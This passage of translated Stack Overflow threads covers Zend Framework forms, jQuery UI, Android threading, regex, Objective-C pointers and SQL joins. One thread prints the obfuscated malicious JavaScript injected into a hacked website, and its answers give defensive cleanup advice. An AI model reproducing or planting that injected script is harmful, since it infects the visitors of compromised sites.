> 赞同：0
> 
> 时间：2019-03-14T06:46:27.123

获取UTC和用户时区（亚洲/加尔各答）之间时区差异的测试功能可以找到 [时区差异](https://stackoverflow.com/questions/24426029/how-to-manage-timezone-for-different-users-of-different-countries-for-a-php-web/55155690#55155690)

# zend-framework - Zend Framework 动态添加表单字段并填充

> ID：10811766
> 
> 赞同：2
> 
> 时间：2012-05-30T07:25:48.700
> 
> 标签：zend-framework, zend-form, populate, zend-form-element, dynamic-forms

我一直在尝试创建一个表单，用户只需按下一个按钮，表单就会添加一个新字段供用户使用。我有 2 个这些动态添加的字段类型。

首先是用户可以上传文件的字段，通过按下添加按钮，另一个字段将粘贴在当前字段下方并准备好使用。

我遵循了一个关于如何使用一些 ajax 和 jQuery 来完成这项工作的旧指南。

准确地说，本指南：http: [//www.jeremykendall.net/2009/01/19/dynamically-adding-elements-to-zend-form/](http://www.jeremykendall.net/2009/01/19/dynamically-adding-elements-to-zend-form/)

如您所见，它来自 2009 年，有点过时，但在当前 Zend Framework 版本 1.11.11 下仍然有效

然而，问题出现了，因为我想要表单的编辑/更新版本。我需要填充它的字段，但首先我需要为要存储的数据创建足够的字段。因此，当有 3 个文件已上传时，它应该创建 2 个附加字段并将 3 个文件名放在这些字段中准备好进行编辑和更新。简单地使用`$form->populate($stuff)`是行不通的

我只是不知道如何做到这一点，关于动态添加字段的教程只涉及到，`addAction`而不是如何`editAction`在这些条件下创建。

是否有关于如何创建和管理此类表单的教程？我敢肯定我不是唯一一个有想法建立这种形式的人吗？

如果有要求，我可以添加我的代码，但它与指南中的示例相同，只是表单中的一组元素不同。

添加一个使用它的小例子。用户添加一个包含 3 个文件的项目，这些文件与文件名一起上传，因此在数据库中它看起来像这样：`File_Id : '1' , File_Name : 'SomeFile' , File_location : 'somewhere/on/my/pc/SomeFile.txt'.`

现在用户意识到他忘记了一个文件或想从该列表中删除一个文件，他转到编辑页面，在这里我希望表单显示以前添加的文件名。因此，如果有 3 个文件，它显示 3，当有 2 个文件时，它显示 2，等等。我如何构建一个表单以根据上传文件的数量动态添加字段，然后填充它们？

任何关于如何处理这个问题的建议都非常感谢:)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-30T11:17:21.423

您可以使用表单的半魔术`setXxx()`方法。

表格内：

```
public function setFiles($files) {
    foreach ($files as $file) {
        $this->addElement(/* add a file element */);
        //do other stuff, like decorators to show the file name, etc.
    }
} 
```

在您的控制器中：

```
$files = $model->getFiles();
$form = new Form_EditFiles(array('files' => $files)); 
```

通过传递一个带有 key 的数组，`files`您将使表单尝试调用`setFiles()`您在上面方便地提供的名为 的方法。

这应该将您推向正确的方向，或者至少我希望如此。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-30T08:55:58.627

如果我理解正确，您想填充文件上传字段，由于安全原因，这是不可能的。

编辑：

`$form->addElement()`您可以通过（基本上就像`$this->addElement()`教程中的语句一样）在控制器内部添加元素

# malware - 根据谷歌网站上的恶意软件，但我找不到它

> ID：10811771
> 
> 赞同：0
> 
> 时间：2012-05-30T07:26:11.993
> 
> 标签：malware

昨天，当我来到我的一个网站时，我收到了来自谷歌的警告，说我的网站上有恶意软件。我查看了代码，确实有一些不应该存在的 javascript。我用谷歌搜索并没有发现任何有用的东西。当我回到我的网站时，该代码已经消失，但谷歌（从搜索引擎访问该网站时）和谷歌浏览器仍然给我一个警告，指出我的网站上有恶意软件。

我查看了网站管理员工具，他们发现很少有页面存在问题。其中之一是[http://www.keramikfliesen.com/schweiz/rimini/](http://www.keramikfliesen.com/schweiz/rimini/)。恶意软件下的网站管理员工具中列出的代码是：

```
<script type='text/javascript'>st="no3nen0orno3pno3rxstxpno3
rxnl";Date&&(a=["a#%d]%b@%e_%c)%1<%5*%4+%9:%3^%2","%7!%0|%f~
%8?%6&"]);var b=[],c="&!^<^]$$&)&~&_&)!:$$^@$|&:&&$?$]^<^]^]
&+&~&^!*&]&*&_!+$_&^&~&~&@&:&*$_&:&_&+&*!?+~&&$?&!^<$:$:!@!?
^+^]^!^$+*^&^@!&&<!$$|&^^]&_&*!!$|++&<!+&*^@&^$_!^&*!+*+&:&]
&*$?&^$_&!&*!+*+&:&]&*$?$:$:^@&*&+^]&_&*!!$|++&<!+&*$?&^$_&!
&*!+*+&:&]&*$?$:$@!?^+$:^@&+&~&^!*&]&*&_!+$_&^&~&~&@&:&*^]&!
^<$@$$^]$$$@&*!^&^&<!|&*$?&*&+$_!+&~+!+]*+*^!+!$&:&_&!$?$:$:
$@$$^@&*!?!|&:!$&*!^^]$$$@&*&+$_!+&~+!+]*+*^!+!$&:&_&!$?$:$@
$$^@!|&<!+&?^]$~$$^@&!^^^]$$&?!+!+!|^#$~$~$$$@!^!+$_!$&*!|&)
&<&^&*$?$~&*&_^|$~&!$)$$&!$$$:$_!$&*!|&)&<&^&*$?$~&_&~^^$~&!
$)$$&*$$$:$_!$&*!|&)&<&^&*$?$~!|&*!$!?$~&!$)$$$_$$$:$@$$$~!+
&~!|^$$_&?!+&]&)$$^@!&&<!$$|&+^]$]^<$<^]&_&<!&&:&!&<!+&~!$$_
!*!^&*!$+<&!&*&_!+$_!+&~+)&~!!&*!$+^&<!^&*$?$:$_&:&_&+&*!?+~
&&$?$$&&&:!$&*&&&~!?$$$:$)&*^]$$^<$$$)&?^]&&!*&_&^!+&:&~&_$?
$:!@!]^@&?$_!|!$&~!+&~!+!:!|&*^]!@&$^#&&!*&_&^!+&:&~&_$?$:!@
!$&*!+!*!$&_$|&!^^!]$)&<^#&&!*&_&^!+&:&~&_$?$:!@!&&<!$$|&&^]
&+&~ 
```

你能帮帮我吗？我该如何对抗这个？

非常感谢大家提前提供的帮助！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-30T07:37:41.297

*   从您的网页中删除恶意软件。
*   立即更改您的密码。
*   还要检查任何[XSS](http://www.owasp.org/index.php/Cross_Site_Scripting)（跨站点脚本）和[SQL 注入](http://www.owasp.org/index.php/SQL_injection)漏洞。
*   停用排名不高或来自知名来源的插件。
*   使用安全协议。查看 StopBadware.org 的[网站清洁和保护技巧](http://www.stopbadware.org/home/security)。
*   密切关注您的日志文件。
*   及时了解最新的软件更新和补丁。

    希望能帮助到你！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-27T14:17:38.853

如果代码再次出现，则攻击者留下了一些脚本，该脚本应请求运行感染程序。通常这个脚本会接收到恶意代码的编码字符串（例如 in `base64`），对其进行解码并通过`eval()`. 您应该找到这个文件（它很可能是一个 PHP 脚本）并将其删除。要找到它，请查看日志并搜索可疑请求（例如，单个`POST`请求，传输`base64`字符串是非常可疑的请求）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-30T07:37:02.740

很可能您的主机已被自动化工具入侵（密码被盗）。该工具通常会在 js 文件中注入一些 javascript，以便用恶意软件感染访问您页面的人。你应该 ：

1.  更改您的密码。
2.  恢复最新的**非**受损备份。

# jquery - 如何使用 jQuery UI

> ID：10811773
> 
> 赞同：3
> 
> 时间：2012-05-30T07:26:21.737
> 
> 标签：jquery, jquery-ui, jquery-plugins, drag-and-drop

[我正在尝试使用fiddle](http://jsfiddle.net/BGqXz/1/)学习 jQuery 拖放。虽然我是 jQuery 新手，但我对 jQuery 和[jQuery UI](http://en.wikipedia.org/wiki/JQuery_UI)感到很困惑。我还需要安装什么？

我已经安装了[jquery-1.6.3.js](http://code.jquery.com/jquery-1.6.3.js)和[jquery-ui.1.8.16.js](http://ajax.aspnetcdn.com/ajax/jquery.ui/1.8.16/jquery-ui.js)。但它没有运行。

我怎样才能让它运行？

代码是：

```
<p class="section">Drag and Drop</p>
<script type="text/javascript" src="/js/jquery-1.6.3.js"></script>
<script type="text/javascript" src="/js/jquery-ui.1.8.16.js"></script>
<script type="text/javascript">
    $('#draggable li').draggable({
        revertDuration: 100,
        helper: function() {
            var selected = $('#draggable img.selected');

            if (selected.length === 0) {
                selected = $('img', $(this)).addClass('selected');
            }
            var container = $('<div class="image-group"/>');
            container.append(selected.clone());
            return container;
        },
        cursorAt: {
            left: 25,
            top: 25
        }
    });

    $('#trash').droppable({
        drop: function(event, ui) {
            var newItems = $(ui.helper).find('img').clone(false).removeClass('selected');
            $(this).append(newItems);
            $('#draggable img.selected').parent().remove();
        }
    });

    $('#draggable li').click(function(event) {
        if (event.ctrlKey) {
            $('img', $(this)).toggleClass('selected');
        }
    });
</script>

<style>
    body {
        font-family:"Trebuchet MS";
    }
    #draggable {
        margin:0;
        padding:10px;
        width:300px;
        list-style-type:none;
        background-color:#000;
    }
    li {
        display:inline;
    }
    img {
        border:5px solid white;
    }
    .image-group img {
        margin-right:5px;
    }
    #trash {
        margin-top:10px;
        width:200px;
        height:200px;
        border:1px dotted #000;
    }
    .selected {
        border-color:#aed0ea
    }
    #trash h4 {
        margin:0;
        padding:0 5px;
    }
    .ui-icon {
        display:inline-block;
    }
</style>

<ul id="draggable">
    <li><img src="http://lorempixel.com/output/nature-q-c-50-50-1.jpg" alt="" /></li>
    <li><img src="http://lorempixel.com/output/nature-q-c-50-50-2.jpg" alt="" /></li>
    <li><img src="http://lorempixel.com/output/nature-q-c-50-50-3.jpg" alt="" /></li>
    <li><img src="http://lorempixel.com/output/nature-q-c-50-50-4.jpg" alt="" /></li>
    <li><img src="http://lorempixel.com/output/nature-q-c-50-50-5.jpg" alt="" /></li>
    <li><img src="http://lorempixel.com/output/nature-q-c-50-50-6.jpg" alt="" /></li>
</ul>
<p>Single left click+drag or Ctrl+left click to select multiple</p>
<div id="trash">
    <h4 class="ui-widget-header">Drop Here<span class="ui-icon ui-icon-trash"></span></h4>
</div> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-30T07:30:09.103

你整个脚本需要被包裹

```
 $(document).ready(function() {
     // your script

   }); 
```

简而言之，

```
 $(function() {
      // your script

   }); 
```

# android - Android - 显示进度条期间出现“无法创建处理程序”错误

> ID：10811777
> 
> 赞同：1
> 
> 时间：2012-05-30T07:26:34.897
> 
> 标签：android

我正在尝试在我的应用程序中显示进度条，但遇到了线程问题。这是我用来执行此操作的代码：

```
package com.integrated.mpr;

import android.app.Activity;
import android.app.ProgressDialog;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Handler;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.ProgressBar;
import android.widget.TextView;

public class Progess extends Activity {

   static String[] display = new String[Choose.n];
   private static final int Progress = 0;

   ProgressBar bar;
   TextView label;
   Handler handler = new Handler();

   @Override
   protected void onCreate(Bundle savedInstanceState) {
      // TODO Auto-generated method stub
      super.onCreate(savedInstanceState);
      setContentView(R.layout.progress);

      bar = (ProgressBar) findViewById(R.id.progBar);

      new Thread(new Runnable() {

         int i = 0;
         int progressStatus = 0;

         public void run() {
            while (progressStatus < 100) {
               progressStatus += doWork();
               try {
                  Thread.sleep(500);
               } catch (InterruptedException e) {
                  e.printStackTrace();
               }

               // Update the progress bar
               handler.post(new Runnable() {
                  public void run() {
                     bar.setProgress(progressStatus);
                     i++;
                  }
               });
            }
         }

         private int doWork() {
            display = new Logic().finaldata();
            return i * 3;
         }

      }).start();

      Intent openList = new Intent("com.integrated.mpr.SENSITIVELIST");
      startActivity(openList);
   }
} 
```

我收到以下 logcat 消息：

> 05-30 12:38:00.082: E/AndroidRuntime(17332): java.lang.RuntimeException: 无法在未调用 Looper.prepare() 的线程内创建处理程序

请帮助我，我是线程新手。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-30T07:28:27.827

与其以这种方式实现线程，我建议您实现**[AsyncTask](http://developer.android.com/reference/android/os/AsyncTask.html)** ，它在 Android中被称为[Painless Threading 。](http://developer.android.com/resources/articles/painless-threading.html)

1.  在里面显示进度条`onPreExecute()`
2.  在里面做后台任务`doInBackground()`
3.  关闭里面的进度条`onPostExecute()`
4.  更新进度条里面`onProgressUpdate()`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-30T07:29:58.650

我认为答案在您问题的错误消息中-请在`Looper.prepare()`之前写`handler.post(new Runnable() ...)`。

以下是一些参考资料：

*   [Android 中的 Looper 和 Handler](http://webcache.googleusercontent.com/search?q=cache%3aJUl_wh4lTkgJ%3arxwen.blogspot.com/2010/08/looper-and-handler-in-android.html%20complete%20tutorial%20looper%20in%20android&cd=8&hl=en&ct=clnk)
*   [Android - Looper 的目的是什么以及如何使用它](https://stackoverflow.com/questions/7597742/android-what-is-the-purpose-of-looper-and-how-to-use-it)（以 Dharmendra 的解决方案为例）。
*   [UI环境中的Android多线程](http://www.aviyehuda.com/2010/12/android-multithreading-in-a-ui-environment/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-30T07:30:58.667

为了快速，请尝试下面的代码。

```
runOnUiThread(new Runnable(){
    @Override
    public void run() {
        bar.setProgress(progressStatus);
        i++;

    }  
} 
```

# c# - 在“$”和“<”之间查找文本的 .net 正则表达式是什么？

> ID：10811778
> 
> 赞同：-6
> 
> 时间：2012-05-30T07:26:38.290
> 
> 标签：c#, regex

我想找到正则表达式模式来查找字符串和字符之间的文本，并用 _ 替换文本中的空格。

例子。`< Node Type="Text">Event Log < /Node >`

预期输出：`Event_Log`

提前致谢。请帮忙。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-30T07:31:59.867

```
 string s = "here is my text $$$ Hello World </stop>";
        Match m = Regex.Match(s, "(\\$[^<]*)<");
        if (m.Success)
        {
            Console.WriteLine(m.Groups[1].Value);
        } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-30T07:39:42.723

```
string str = "$$$ Hello World </stop>";
string sPattern = "[\\$]{3}([\\d\\s\\w]*)</stop>";

Match m = Regex.Match(str, sPattern, RegexOptions.IgnoreCase);

if (m.Success) {
    Console.WriteLine(m.Groups(1));
} 
```

从 VB 代码转换而来，之后没有测试，但应该没问题。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-30T07:34:05.810

假设示例是正确的并且您的问题文本错误，您需要：

```
\$+[^$<]*(?=<) 
```

如果反过来，试试这个：

```
(?<=\$+)[^$<]*< 
```

顺便说一句，像这样的所有问题都可以使用这个[在线正则表达式测试器](http://derekslager.com/blog/posts/2007/09/a-better-dotnet-regular-expression-tester.ashx)这样的工具来更容易地回答。

# objective-c - Objective-c 指针

> ID：10811780
> 
> 赞同：1
> 
> 时间：2012-05-30T07:26:39.673
> 
> 标签：objective-c, ios

我有一个财产：

```
@property(nonatomic, assign)UIView *currentView; 
```

当我处理以下代码时，为什么它会中断？

```
_currentView  =nil;
UIView * v1 = [[UIView alloc] initWithFrame:CGRectZero];
_currentView = v1;
NSLog(@"_currentView %@", _currentView);
NSLog(@"v1 %@", v1);
[v1 release];
NSLog(@"_currentView %@", _currentView);     ///break here. 
NSLog(@"v1 %@", v1); 
```

我认为`_currentView`and`v1`都指向同一个记忆。用于`v1`重新生成对象，并用于`_currentView`打印对象时，它会崩溃。我可以理解这一点。

但是，如果在`v1`release 之后和 print 之前添加后续行`_currentView`。我无法理解日志。

```
v1 = nil; 
```

如下代码

```
_currentView  =nil;
UIView * v1 = [[UIView alloc] initWithFrame:CGRectZero];
_currentView = v1;
NSLog(@"_currentView %@", _currentView);
NSLog(@"v1 %@", v1);
[v1 release];
v1 = nil;
NSLog(@"_currentView %@", _currentView);
NSLog(@"v1 %@", v1); 
```

打印结果是：

```
> 2012-05-30 15:16:57.314 All[3068:15203] _currentView <UIView:
0x81ccbc0; frame = (0 0; 0 0); layer = <CALayer: 0xa07e5a0>>
> 2012-05-30 15:16:57.798 All[3068:15203] v1 <UIView: 0x81ccbc0; frame =
(0 0; 0 0); layer = <CALayer: 0xa07e5a0>
> 2012-05-30 15:16:59.189 All[3068:15203] _currentView <UIView: 0x81ccbc0; frame = (0 0; 0 0); transform = [0, 0, 0, 0, 0, 0]; alpha = 0; layer = (null)
> 2012-05-30 15:17:09.042 All[3068:15203] v1 (null) 
```

为什么调用`v1`release 和 log后`_currentView`，它会打印

```
_currentView &lt;UIView: 0x81ccbc0; frame = (0 0; 0 0);
 transform = [0, 0, 0, 0, 0, 0]; alpha = 0; layer = (null)&gt; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-30T08:21:23.817

这不一定与`@property`属性（分配或保留）相关，因为您没有使用访问器

这是您的代码中发生的情况：

```
@property(nonatomic, assign)UIView *currentView; 
```

你声明一个 ivar 是`assign`虽然在这种情况下这无关紧要，因为你没有使用`self.currentView`or `[self setCurrentView:...];`。

```
_currentView = nil;
// You just made your pointer _currentView point to nil or 0

UIView *v1 = [[UIView alloc] initWithFrame:CGRectZero];
// You created an UIView object and made v1 to point to it. (v1 is NOT the real object)

_currentView = v1;
// You just made _currentView to point the same object v1 points to

NSLog(@"_currentView %@", _currentView);
// and because of that you correctly see the object here (because _currentView points to the view object)

NSLog(@"v1 %@", v1);
// also here (because v1 points to the object from the start)

[v1 release];
// now you release the object pointed by v1 , since no other is retaining it, it gets deallocated BUT note that v1 is still pointing to it, which now is garbage memory!)

//NSLog(@"_currentView %@ v1 %@", _currentView, v1);
// If above line were executed the app will crash because of v1 and _currentView both are pointing to the object that was just released and it is not valid anylonger.

v1 = nil;
// Now you made v1 to point to nothing so next time you use it terrible things will not happen (★) :)

NSLog(@"_currentView %@", _currentView);
// Oh no! you called _currentView and since it was still pointing to the object you released a bit ago the app crashes :(

NSLog(@"v1 %@", v1);
// This is fine, you set v1 to point to nil so it is not pointing to some garbage memory you simply get nil. 
```

(★) 因为在objective-c中发送方法to`nil`是无害的，使用nil作为其他方法的参数是另外一回事

### 另一件事：

即使你写`self.currentView = v1;`而不是`_currentView = v1;`结果也是一样的，因为正确地被声明为赋值。

如果您将属性声明为`retain`. 在这种情况下，在您执行此操作后，`[v1 release];`该对象将不会被释放，因为该对象由 currentView ( `self.currentView = v1`) 保留。然后，如果您这样做，`v1 = nil`v1 将指向 nil，并且该对象只能由 currentView 访问。然后，如果你这样做，`_currentView = nil`那么 _currentView 将指向 nil 但对象本身不会被释放，因为你没有使用附属方法（也没有显式释放），因此你会得到一个悬空指针。

并非所有声明为保留的时间属性都是解决方案，这是逐案的。我建议阅读更多关于 Obj-c 中的内存管理的内容（至少[this](http://interfacelab.com/objective-c-memory-management-for-lazy-people/)），还有一些关于 C 指针的内容，然后是关于 ARC 的内容

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-30T07:37:38.633

您获得第二个输出的不同打印输出的原因如下：

执行后：**v1**和**_currentView**`[v1 release];`都指向旧的内存块。但是设置只会将**v1**设置为 nill 而不是**_currentView**（记住这些是指针）。****`v1 = nil;`****

 ******我希望这可以为您澄清事情。

亲切的问候，
博

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-30T07:31:02.783

问题是您如何声明该属性：

```
@property(nonatomic, assign)UIView *currentView; 
```

它应该是：

```
@property(nonatomic, retain)UIView *currentView; 
```

当您尝试 时`NSLog`，它将具有垃圾价值，因为您之前释放了它：

```
[v1 release];
NSLog(@"_currentView %@", _currentView); 
```

请记住，此时，当您尝试`NSLog`它时，**v1**和**_currentView**将指向同一个内存块。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-30T10:27:28.980

只想在 nacho4d 的答案中加一分。如果你`NSLog`是一个释放的对象，有时它会崩溃，有时它不会。当对象被释放时，所发生的一切就是它被重新添加到空闲内存块列表中。内存的实际内容仍然看起来像一个对象，并且在部分或全部块被重用之前，向它发送消息通常可以正常工作。

当您 NSLog 一个已释放的对象时，可能会发生以下三种情况之一。

*   它可以像还活着一样记录
*   如果完全不同的对象从同一个地方开始，它可能会做出响应
*   你得到 EXC_BAD_ACCESS

无论发生哪种情况，很大程度上都是机会问题。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-05-30T11:17:58.823

您正在声明一个属性，但您没有使用它，而是直接使用实例变量。此外，您无法保留变量指向的内存。

看起来您在类中声明了一个实例变量：

```
@interface MyClass : NSObject {
    UIView * _currentView;
}

@end 
```

您正在做的是直接访问它，而不使用该属性。发生的情况是您在分配内存时没有保留它，这意味着您正在完全释放它并且它被删除。*要使其以这种方式工作，您可以这样做：*

```
UIView * v1 = [[UIView alloc] initWithFrame:CGRectZero];
[_currentView release];
_currentView = [v1 retain]; // <-- OBSERVE the retain
NSLog(@"_currentView %@", _currentView);
NSLog(@"v1 %@", v1);
[v1 release];
NSLog(@"_currentView %@", _currentView);     // Should not break anymore
NSLog(@"v1 %@", v1); 
```

后面需要释放_currentView中保留的对象：

```
-(void)dealloc {
    [_currentView release];   
} 
```

（请注意，如果要为 _currentView 分配新值，也需要这样做）

**另一种方法**是实际使用您声明的属性，而是使用保留属性：

```
@property(nonatomic, retain)UIView *currentView; 
```

为了使其可访问，您需要在类实现中对其进行综合：

```
@implementation MyClass 

@synthesize currentView = _currentView;

/*...*/

@end 
```

这将使保留为您处理。此外，您无需考虑释放存储在变量中的先前值，因为它将为您处理。但是，您需要以这种方式访问​​该属性：

```
 self.currentView 
```

您的代码示例如下所示：

```
UIView * v1 = [[UIView alloc] initWithFrame:CGRectZero];
self.currentView = v1;
NSLog(@"currentView %@", self.currentView);
NSLog(@"_currentView %@", _currentView);
NSLog(@"v1 %@", v1);
[v1 release];
NSLog(@"currentView %@", self.currentView);
NSLog(@"_currentView %@", _currentView);     ///Should not break anymore 
NSLog(@"v1 %@", v1); 
```

正如您从打印输出中看到的那样，这两个变量仍然指向同一个内存。不同之处在于，由于您要保留内存，因此会向其中添加一个保留计数器。在保留计数器达到 0 之前，内存不会被释放，这意味着每次保留它都需要释放一次。同样在后一种情况下，您需要在您的 dealloc 方法中释放保留：

```
-(void)dealloc {
    [_currentView release];   
} 
```

至于你最后一个问题这一行

```
v1 = nil; 
```

只会影响 v1 指向的地址。它不会影响变量 _currentView 也不会影响它指向的内存。******

# mysql - JOIN - 在列名之前添加表名是一个好习惯吗？

> ID：10811792
> 
> 赞同：1
> 
> 时间：2012-05-30T07:27:21.520
> 
> 标签：mysql, performance

在一本 oracle 书中，我读到当我们通过连接 2 个或更多表执行 SELECT 时，如果在列名之前使用 tablename，则 SELECT 工作得更快。
例如：
`SELECT table1.name, table1.dob....`代替`SELECT name, dob....`

MySQL中的方式是否相同？

**编辑**

我知道当有相同的字段名称时，这是一个很好的做法。我在想的是关于性能的观点，即使没有相同的字段名称

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-30T07:36:14.170

我不知道性能，但这是一个很好的做法，尤其是在加入表格时。例如，连接的表可能具有相同的字段名称，然后查询将失败。如果您的表名太长，您也可以使用别名：

```
SELECT t1.name, t2.dob FROM table1 t1 JOIN table t2 ON ... 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-30T07:37:29.697

从**效率**的角度来看，Oracle和MySQL在执行之前将SQL**编译**为内部表示，因此我认为执行时间不会有很大差异，因为如果不指定，它们将根据字段名称来决定表. 时间差将在编译时，他们为每个字段推导出表。

事实上，我个人怀疑如果指定了表名，Oracle 执行速度会更快！

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-30T23:48:37.460

当字段名称相同时，这不是一个好习惯，它始终是一个好习惯。这与效率无关，而是当其他人将字段添加到具有重叠名称的联接表之一时，您的查询不会中断，因此您的东西可以在六个月内工作，而不仅仅是今天。

# jquery - jquery-ui 仅对另一个 div 中存在的单个 div 进行排序，忽略其中的所有其他 div

> ID：10811793
> 
> 赞同：0
> 
> 时间：2012-05-30T07:27:22.673
> 
> 标签：jquery, jquery-ui, jquery-ui-sortable

我有这样的 div 结构：

```
<div id="container">
    <div id="row1" class="row">
        <div class="c1"></div>
        <div class="c2"></div>
        <div class="c3"></div>
    </div>      
    <div id="row2" class="row">
        <div class="c1"></div>
        <div class="c2"></div>
        <div class="c3"></div>
    </div>      
    <div id="row3" class="row">
        <div class="c1"></div>
        <div class="c2"></div>
        <div class="c3"></div>
    </div>      

</div> 
```

从上面的代码中，我想要的是，我应该能够只对行进行排序。意思是，用 row2 交换 row1 ，就像那样。

我尝试了什么：

```
 $("#container").sortable()
 $("#container").sortable({connectWith : '.row'})
 $(".row").sortable({connectWith : '#container'}) 
```

解决方案是什么，我的每个项目都面临这个问题，你能解释一下如何准确地使用它吗？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-30T07:29:40.073

简单地尝试

```
 $("#container").sortable({ handle : '.row'}) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-30T07:32:47.527

```
 $("#container").sortable(); 
```

工作得很好。

**[演示](http://jsfiddle.net/EvrLq/2/)**

问题可能由以下原因引起：

*   忘记包含 jQuery
*   忘记包含 jQueryUI 库
*   不要用`$(documet).ready(function() {...})`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-30T07:36:48.650

你的意思是这样[吗](http://jsfiddle.net/8zhhf/)？

如果是这样，您需要的唯一 jQuery 是：

```
 $("#container").sortable(); 
```

# ios - 错误单步执行计数器

> ID：10811797
> 
> 赞同：0
> 
> 时间：2012-05-30T07:27:31.773
> 
> 标签：ios, xcode

我想创建一个计数器，每次它满足我代码的 if 块中的条件时，它都会更新一个。为此，我实现了单音，而不是在 .h 文件中定义全局变量…………</p>

```
@interface MONObject : NSObject {
int *counterplus;
}
@property(nonatomic) int *counterplus;
+(MONbject*) sharedinstance;
@end 
```

在 .m 文件中

```
static MON object * sharedinstance;
@implementation MONbject;
@synthesize counterplus;

+(MONbject*)sharedinstance
{
if(!sharedinstance){
sharedinstance=[[MONObject alloc]init];
}
return sharedinstance
}
-(MONObject*) int
{
self=[super init];
if(0!=self){
counterplus=0;
}
return self;
}
@end 
```

我把上面的称为……</p>

```
if(condition){
[MONObject sharedinstance].counterplus++;
} 
```

当我尝试使用 打印它的值时`NSLog`，程序停止并给出此错误“单步执行直到从函数 objc_msgSend 退出，该函数没有行号信息。警告远程故障回复：E37

我一点头绪都没有。我尝试通过将全局变量定义为 extern 并尝试递增来使用它。但它给出了同样的错误。有什么办法可以做到这一点？你能指出其中的错误吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-30T07:36:41.267

这将是 -

```
@property(nonatomic) int counterplus; 
```

代替 -

```
@property(nonatomic) int *counterplus; 
```

对于记录 int 值，请使用 -

```
NSLog(@"%d", counterplus); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-30T07:39:49.037

应该是

```
@interface MONObject : NSObject {
int counterplus;
}
@property(nonatomic, assign) int counterplus;
+(MONbject*) sharedinstance;
@end 
```

希望能帮助到你。快乐编码:)

# android - 通过照片获取联系人信息的有效方法

> ID：10811801
> 
> 赞同：1
> 
> 时间：2012-05-30T07:28:03.847
> 
> 标签：android, cursor, contacts, android-contacts

我想获取所有联系人的一些基本信息（我使用 api lvl 8）。目前我使用这个代码片段

```
private List<ContactInfo> readContacts() {

    ContentResolver cr = getContentResolver();
    Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI, null,
            null, null, Phone.DISPLAY_NAME + " ASC");

    for (int i = 0; i < cur.getColumnCount(); i++) {

        Log.v("COlum", cur.getColumnName(i));

    }
    List<ContactInfo> temp = new ArrayList<ContactInfo>();
    if (cur.getCount() > 0) {

        while (cur.moveToNext()) {
            ContactInfo mContactInfo = new ContactInfo();
            String id = cur.getString(cur
                    .getColumnIndex(ContactsContract.Contacts._ID));
            mContactInfo.setId(Long.parseLong(id));
            String name = cur
                    .getString(cur
                            .getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
            if (Integer
                    .parseInt(cur.getString(cur
                            .getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
                mContactInfo.setmDisplayName(name);

                // get the <span class="IL_AD" id="IL_AD7">phone
                // number</span>
                Cursor pCur = cr.query(
                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        null,
                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID
                                + " = ?", new String[] { id }, null);
                while (pCur.moveToNext()) {
                    String phone = pCur
                            .getString(pCur
                                    .getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));

                    mContactInfo.setmPhoneNumber(phone);
                }
                pCur.close();

                // get email and type

                Cursor emailCur = cr.query(
                        ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                        null,
                        ContactsContract.CommonDataKinds.Email.CONTACT_ID
                                + " = ?", new String[] { id }, null);
                while (emailCur.moveToNext()) {
                    // This would allow you get several email <span
                    // class="IL_AD" id="IL_AD9">addresses</span>
                    // if the email addresses were stored in an array
                    String email = emailCur
                            .getString(emailCur
                                    .getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA));

                    mContactInfo.setmEmail(email);
                }
                emailCur.close();

                temp.add(mContactInfo);
            }
        }
    }
    return temp;

} 
```

并传递给自定义适配器（扩展 baseadapter）。我使用以下方式获取联系人的照片：

```
public static Bitmap loadContactPhoto(ContentResolver cr, long id) {
        Uri uri = ContentUris.withAppendedId(
                ContactsContract.Contacts.CONTENT_URI, id);
        InputStream input = openContactPhotoInputStream1(cr, uri);
        if (input == null) {
            return null;
        }
        return BitmapFactory.decodeStream(input);
} 
```

我用 2x 联系人在我的手机上进行了测试（有照片）。我花了大约 10 秒的时间在第一次运行时获取所有联系人。我尝试在应用程序设置中强制关闭并再次运行。这次花了~2s来获取数据。所以我想知道获取联系人信息的最有效方法。

我发现了一些类似的 SO 问题，但它们不需要照片。[android 中的联系人](https://stackoverflow.com/questions/4889737/contacts-in-android) 我尝试使用光标和光标适配器，但我不知道同时获取 photo_uri + 联系人姓名的查询。

**编辑**：我删除了所有我可以在循环之外的 getColumnIndex 并且只投影我想要的列。性能更好（10s => 5s）。

